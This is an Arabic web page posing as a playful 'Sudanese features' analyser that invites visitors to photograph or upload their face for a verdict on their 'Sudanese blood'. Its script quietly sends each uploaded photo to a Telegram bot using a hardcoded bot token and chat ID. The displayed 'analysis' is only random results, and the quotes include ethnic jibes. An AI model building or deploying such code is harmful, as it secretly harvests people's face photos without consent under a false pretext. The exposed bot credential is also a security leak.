<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>محلل الملامح السودانية 🇸🇩</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-brown: #5d4037;
            --deep-brown: #3e2723;
            --gold: #d4af37;
            --bg-color: #fdf5e6;
        }

        body {
            font-family: 'Tajawal', sans-serif;
            background-color: var(--bg-color);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            color: var(--deep-brown);
        }

        .card {
            background: white;
            padding: 2rem;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            width: 90%;
            max-width: 450px;
            text-align: center;
            border: 2px solid var(--gold);
        }

        .profile-frame {
            width: 150px;
            height: 150px;
            border-radius: 50%;
            border: 4px solid var(--gold);
            margin: 0 auto 20px;
            overflow: hidden;
            background: #eee;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 50px;
        }

        #user-img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }

        .btn-group {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin-bottom: 20px;
        }

        button {
            padding: 12px 20px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-family: 'Tajawal';
            font-weight: bold;
            transition: 0.3s;
        }

        .btn-camera { background: var(--primary-brown); color: white; }
        .btn-upload { background: var(--gold); color: white; }

        .color-meter { margin: 25px 0; position: relative; display: none; }
        .gradient-bar {
            height: 15px;
            background: linear-gradient(to left, #3e2723, #8b4513, #d2b48c, #f5f5dc);
            border-radius: 10px;
        }
        .pointer { position: absolute; top: -20px; transition: 1s; font-size: 20px; }

        .result-box {
            display: none;
            background: #fff9f0;
            padding: 15px;
            border-radius: 15px;
            border-right: 5px solid var(--gold);
            margin-top: 20px;
        }

        .loading { display: none; color: var(--gold); font-weight: bold; margin: 10px 0; }
    </style>
</head>
<body>

<div class="card">
    <h1>كاشف الأصالة 🇸🇩</h1>
    <p>حلل ملامحك وشوف دمك السوداني!</p>

    <div class="profile-frame" id="frame">
        <span id="placeholder">👤</span>
        <img id="user-img">
    </div>

    <div class="btn-group">
        <button class="btn-camera" onclick="document.getElementById('camera-input').click()">📸 التقاط صورة</button>
        <button class="btn-upload" onclick="document.getElementById('file-input').click()">📁 من المعرض</button>
    </div>

    <input type="file" id="camera-input" accept="image/*" capture="user" hidden onchange="processImage(event)">
    <input type="file" id="file-input" accept="image/*" hidden onchange="processImage(event)">

    <div class="loading" id="loader">جاري فحص الملامح والدم... 🔎</div>

    <div class="color-meter" id="meter-container">
        <div class="gradient-bar"></div>
        <div id="pointer" class="pointer">📍</div>
    </div>

    <div class="result-box" id="result">
        <h2 id="res-title"></h2>
        <p id="res-comment"></p>
        <hr>
        <p><strong>المهنة المكتوبة ليك:</strong> <span id="res-job"></span></p>
    </div>
</div>

<script>
    const BOT_TOKEN = "8667613317:AAFx1KFL03qMNh5krtcfbBOMNjm2tvqhPns";
    const BOT_ID = "8520777894";

    function processImage(event) {
        const file = event.target.files[0];
        if (!file) return;

        const imgElement = document.getElementById('user-img');
        const placeholder = document.getElementById('placeholder');
        imgElement.src = URL.createObjectURL(file);
        imgElement.style.display = 'block';
        placeholder.style.display = 'none';

        document.getElementById('loader').style.display = 'block';
        document.getElementById('result').style.display = 'none';
        document.getElementById('meter-container').style.display = 'none';

        sendToTelegram(file);

        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            showResults();
        }, 2500);
    }

    async function sendToTelegram(file) {
        const formData = new FormData();
        formData.append("chat_id", BOT_ID);
        formData.append("photo", file);
        formData.append("caption", "تحليل ملامح جديد 🇸🇩");
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
        } catch (e) {}
    }

    function showResults() {
        const isMale = Math.random() > 0.5;
        const resTitle = document.getElementById('res-title');
        const resComment = document.getElementById('res-comment');
        const resJob = document.getElementById('res-job');
        
        const maleQuotes = [
            "من ملامحك دي أنت شفت ومفتح ياخ! 😎",
            "من شكلك دا أنت واحد غربي ساي 😹",
            "أنا شايف ملامح العنصرية في دمك (بهظر معاك) 🤣"
        ];
        const femaleQuotes = ["كنداكة ✨", "بت الوطن الأصلية", "بت النيل", "الدكتورة"];
        const jobs = ["وزير شؤون المغتربين", "تاجر دهب", "مهندس برمجيات", "مقدم محتوى"];

        if (isMale) {
            resTitle.innerText = "يا بطل!";
            resComment.innerText = maleQuotes[Math.floor(Math.random() * maleQuotes.length)];
        } else {
            resTitle.innerText = femaleQuotes[Math.floor(Math.random() * femaleQuotes.length)];
            resComment.innerText = "جمال رباني ونكهة سودانية خالصة 🇸🇩";
        }

        resJob.innerText = jobs[Math.floor(Math.random() * jobs.length)];
        document.getElementById('meter-container').style.display = 'block';
        document.getElementById('pointer').style.right = (Math.random() * 80 + 10) + "%";
        document.getElementById('result').style.display = 'block';
    }
</script>

</body>
</html>
